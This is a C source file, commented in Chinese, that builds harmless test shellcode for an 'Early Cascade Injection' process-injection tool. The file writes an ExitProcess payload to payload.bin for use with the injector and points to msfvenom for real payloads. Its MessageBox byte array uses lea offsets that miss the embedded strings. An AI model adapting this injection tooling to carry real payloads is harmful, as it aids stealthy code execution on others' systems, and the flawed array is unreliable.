/**
 * ===================================================================
 * Shellcode 生成器 - Early Cascade Injection
 * ===================================================================
 *
 * 生成简单的 MessageBox shellcode 用于测试
 */

#include <windows.h>
#include <stdio.h>

/**
 * ===================================================================
 * Shellcode：弹出 MessageBox
 *
 * 这是一个简单的 x64 shellcode，功能：
 * 1. 动态解析 user32.dll 和 MessageBoxA
 * 2. 调用 MessageBoxA 弹出消息框
 * 3. 调用 ExitProcess 退出
 * ===================================================================
 */
unsigned char shellcode_messagebox_x64[] = {
    // 这里使用简化版 shellcode
    // 实际应用中应该使用完整的 PIC shellcode

    // sub rsp, 0x28
    0x48, 0x83, 0xEC, 0x28,

    // xor rcx, rcx (hWnd = NULL)
    0x48, 0x31, 0xC9,

    // mov rdx, <lpText address>
    // 使用 PC-relative lea 指令
    0x48, 0x8D, 0x15, 0x1F, 0x00, 0x00, 0x00,  // lea rdx, [rip+0x1f]

    // mov r8, <lpCaption address>
    0x4C, 0x8D, 0x05, 0x2A, 0x00, 0x00, 0x00,  // lea r8, [rip+0x2a]

    // xor r9d, r9d (uType = MB_OK)
    0x45, 0x31, 0xC9,

    // mov rax, <MessageBoxA address>
    // 注意：这需要动态解析或硬编码
    // 这里使用占位符，运行时需要 patch
    0x48, 0xB8, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,

    // call rax
    0xFF, 0xD0,

    // xor ecx, ecx (uExitCode = 0)
    0x31, 0xC9,

    // mov rax, <ExitProcess address>
    0x48, 0xB8, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,

    // call rax
    0xFF, 0xD0,

    // Strings (null-terminated)
    // lpText: "Early Cascade Injection!"
    0x45, 0x61, 0x72, 0x6C, 0x79, 0x20, 0x43, 0x61,
    0x73, 0x63, 0x61, 0x64, 0x65, 0x20, 0x49, 0x6E,
    0x6A, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x21,
    0x00,

    // lpCaption: "Success"
    0x53, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x00
};

/**
 * ===================================================================
 * 更简单的 shellcode：仅调用 ExitProcess(0)
 * 用于快速测试，不依赖 MessageBox
 * ===================================================================
 */
unsigned char shellcode_exit_x64[] = {
    // sub rsp, 0x28
    0x48, 0x83, 0xEC, 0x28,

    // xor ecx, ecx (uExitCode = 0)
    0x31, 0xC9,

    // mov rax, <ExitProcess address>
    // 需要在运行时 patch
    0x48, 0xB8, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,

    // call rax
    0xFF, 0xD0,

    // int3 (如果 ExitProcess 失败)
    0xCC
};

/**
 * ===================================================================
 * 写入 shellcode 到文件
 * ===================================================================
 */
BOOL WriteShellcodeToFile(const char* filename, unsigned char* shellcode, DWORD size) {
    HANDLE hFile = CreateFileA(
        filename,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create file: %s (Error: %lu)\n", filename, GetLastError());
        return FALSE;
    }

    DWORD bytesWritten;
    if (!WriteFile(hFile, shellcode, size, &bytesWritten, NULL) || bytesWritten != size) {
        printf("[-] Failed to write shellcode (Error: %lu)\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);
    return TRUE;
}

/**
 * ===================================================================
 * 生成完整的 PIC shellcode（带 API 解析）
 *
 * 这个版本会生成真正的 PIC shellcode
 * ===================================================================
 */
BOOL GeneratePicShellcode(const char* filename) {
    // 简化版：使用 msfvenom 生成的 shellcode
    // 在实际实现中，应该使用类似 Ruy-Lopez 的 API 动态解析

    printf("[*] Generating PIC shellcode...\n");
    printf("[!] For production use, integrate with API resolution (see Ruy-Lopez)\n");
    printf("[*] Current version: Simple exit shellcode for testing\n\n");

    // Patch ExitProcess 地址
    unsigned char shellcode[sizeof(shellcode_exit_x64)];
    memcpy(shellcode, shellcode_exit_x64, sizeof(shellcode_exit_x64));

    // 获取 ExitProcess 地址
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        printf("[-] Failed to get kernel32.dll handle\n");
        return FALSE;
    }

    PVOID pExitProcess = GetProcAddress(hKernel32, "ExitProcess");
    if (!pExitProcess) {
        printf("[-] Failed to get ExitProcess address\n");
        return FALSE;
    }

    // Patch 地址到 shellcode (offset 8)
    memcpy(&shellcode[8], &pExitProcess, sizeof(PVOID));

    printf("[+] ExitProcess address: 0x%p\n", pExitProcess);

    // 写入文件
    if (!WriteShellcodeToFile(filename, shellcode, sizeof(shellcode))) {
        return FALSE;
    }

    printf("[+] Shellcode written to: %s (%zu bytes)\n", filename, sizeof(shellcode));
    return TRUE;
}

/**
 * ===================================================================
 * 主函数
 * ===================================================================
 */
int main(int argc, char* argv[]) {
    printf("===================================================================\n");
    printf("Shellcode Generator - Early Cascade Injection\n");
    printf("===================================================================\n\n");

    const char* outputFile = "payload.bin";
    if (argc >= 2) {
        outputFile = argv[1];
    }

    if (!GeneratePicShellcode(outputFile)) {
        printf("\n[-] Failed to generate shellcode!\n");
        return 1;
    }

    printf("\n[+] Shellcode generation completed!\n");
    printf("[*] Use with: early_cascade.exe <process> %s\n", outputFile);

    return 0;
}
